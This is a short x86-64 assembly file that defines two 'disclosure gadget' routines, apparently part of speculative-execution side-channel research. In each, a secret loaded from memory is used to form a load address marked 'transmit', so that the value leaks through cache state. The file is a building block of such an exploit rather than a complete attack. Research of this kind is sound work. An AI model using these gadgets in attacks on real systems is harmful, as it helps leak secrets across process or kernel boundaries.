.intel_syntax noprefix

.section .text

.align 64
.global disclosure_gadget
disclosure_gadget:
    mov     r13, qword ptr [rdi+0x38]   # Load secret address
    mov     rsi, qword ptr [rdi+0x18] # Load base address
    mov     edx, dword ptr [r13+0x2c]   # Load secret
    sub     rsi, rdx
    mov     rax, qword ptr [rsi]   # transmit
    int3
    int3

.align 64
.global disclosure_gadget_constant_blind
disclosure_gadget_constant_blind:
    mov    rax,QWORD PTR [rdi+0x8] # load secret address
    mov    rcx,QWORD PTR [rdx+0x230] # load &base
    mov    DWORD PTR [rbp-0x2c],esi
    mov    rbx,QWORD PTR [rax+0x38]
    movzx  eax,WORD PTR [rax+0x40] # load secret 16-byte
    mov    QWORD PTR [rbp-0x38],rbx
    test   rcx,rcx
    je     1f
    cmp    rax,QWORD PTR [rcx+0x8]
    jae    1f
    mov    rcx,QWORD PTR [rcx+0x18] # load base address
    mov    r12,QWORD PTR [rcx+rax*8] # transmit
1:
    int3
    int3
